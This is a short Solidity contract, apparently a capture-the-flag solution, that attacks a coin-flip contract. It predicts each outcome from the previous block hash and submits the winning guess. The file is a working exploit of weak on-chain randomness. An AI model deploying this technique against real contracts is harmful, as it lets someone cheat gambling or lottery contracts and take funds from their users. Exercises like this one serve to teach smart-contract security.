// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

interface ICoinFlip{
    function flip(bool _guess) external returns (bool);
}

contract coinflipCheater{
    using SafeMath for uint256;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    ICoinFlip public immutable coinFlipContract;

    constructor(address _coinFlipContract){
        coinFlipContract = ICoinFlip(_coinFlipContract);
    }

    function attack() public{
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    if(coinFlip == 1){
        coinFlipContract.flip(true);
    }else{
        coinFlipContract.flip(false);
    }
    }
    
}